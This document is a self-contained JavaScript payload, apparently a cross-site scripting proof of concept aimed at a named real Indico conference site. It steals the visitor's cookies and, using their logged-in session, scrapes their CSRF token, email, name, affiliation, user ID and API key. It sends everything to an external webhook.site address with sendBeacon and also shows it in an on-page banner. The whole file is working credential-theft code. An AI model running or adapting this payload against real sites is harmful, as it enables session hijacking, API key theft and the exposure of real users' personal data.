(function () {
  var WEBHOOK = 'https://webhook.site/d4a92c22-be5c-4ee4-86c1-70ac738e3d61';
  var cookies = document.cookie;
  var evidence = { cookies: cookies };

  fetch('https://indico.iter.org/user/profile/', { credentials: 'include' })
    .then(function (r) { return r.text(); })
    .then(function (html) {
      var g = function (re) { var m = html.match(re); return m ? m[1] : null; };

      evidence.csrf = g(/name="csrf-token"[^>]*content="([^"]+)"/)
        || g(/name="csrf_token"[^>]*value="([^"]+)"/);
      evidence.email = g(/name="email"[^>]*value="([^"]+)"/)
        || g(/"email":\s*"([^"]+)"/)
        || g(/email['"]\s*:\s*['"]([\w.+-]+@[\w.-]+)['"]/);
      evidence.first_name = g(/name="first_name"[^>]*value="([^"]+)"/)
        || g(/"first_name":\s*"([^"]+)"/);
      evidence.last_name = g(/name="last_name"[^>]*value="([^"]+)"/)
        || g(/"last_name":\s*"([^"]+)"/);
      evidence.affiliation = g(/name="affiliation"[^>]*value="([^"]+)"/)
        || g(/"affiliation":\s*"([^"]+)"/);
      evidence.user_id = g(/data-user-id="(\d+)"/);

      if (!evidence.csrf) {
        evidence.step = 'profile_failed';
        report(evidence);
        return;
      }

      evidence.step = 'profile_read';
      report(evidence);

      return fetch('https://indico.iter.org/user/api/', { credentials: 'include' })
        .then(function (r) { return r.text(); })
        .then(function (apiHtml) {
          var g2 = function (re) { var m = apiHtml.match(re); return m ? m[1] : null; };

          var apiKey = g2(/<code[^>]*>([a-f0-9]{20,})<\/code>/)
            || g2(/class="[^"]*token[^"]*"[^>]*>([a-f0-9]{20,})</)
            || g2(/Token[^<]{0,200}?([a-f0-9]{32,})/)
            || g2(/API Key[^<]{0,300}?([a-f0-9]{20,})/)
            || g2(/id="api[_-]?key[^"]*"[^>]*>([^<]+)</)
            || g2(/key.?token[^<]{0,100}?([a-f0-9]{20,})/i);

          var created = g2(/[Cc]reated[^<]{0,100}?(\d{4}[^<]{5,20})/);
          var totalUses = g2(/[Tt]otal [Uu]ses[^<]{0,50}?(\d+)/);
          var lastUsed = g2(/[Ll]ast [Uu]sed[^<]{0,100}?(\d{4}[^<]{5,20})/);

          var hasCreate = /Create.*API key|create_key|key_create/i.test(apiHtml);
          var hasDelete = /Delete.*API key|delete_key|key_delete/i.test(apiHtml);

          var apiIdx = apiHtml.indexOf('API Key');
          if (apiIdx === -1) apiIdx = apiHtml.indexOf('api-key');
          if (apiIdx === -1) apiIdx = apiHtml.indexOf('apikey');
          if (apiIdx === -1) apiIdx = apiHtml.indexOf('Token');
          if (apiIdx === -1) apiIdx = Math.floor(apiHtml.length / 2);

          evidence.step = 'api_key_page';
          evidence.api_key = apiKey;
          evidence.api_created = created;
          evidence.api_total_uses = totalUses;
          evidence.api_last_used = lastUsed;
          evidence.has_create = hasCreate;
          evidence.has_delete = hasDelete;
          evidence.api_html_length = apiHtml.length;
          evidence.api_section = apiHtml.substring(Math.max(0, apiIdx - 200), apiIdx + 3000);
          report(evidence);
        });
    })
    .catch(function (err) {
      evidence.step = 'error';
      evidence.error = err.message;
      report(evidence);
    });

  function report(ev) {
    var b = document.createElement('pre');
    b.style.cssText = 'position:fixed;top:0;left:0;right:0;z:999999;'
      + 'background:#b00;color:#fff;margin:0;padding:16px;font:13px/1.6 monospace;'
      + 'max-height:50vh;overflow:auto';
    b.textContent = 'Step: ' + (ev.step || '?') + '\n'
      + 'CSRF: ' + (ev.csrf || 'n/a') + '\n'
      + 'Email: ' + (ev.email || 'n/a') + '\n'
      + 'Name: ' + (ev.first_name || '') + ' ' + (ev.last_name || '') + '\n'
      + 'API Key: ' + (ev.api_key || 'searching...') + '\n'
      + 'User ID: ' + (ev.user_id || 'n/a');
    document.body.appendChild(b);
    navigator.sendBeacon(WEBHOOK, JSON.stringify(ev));
  }
})();
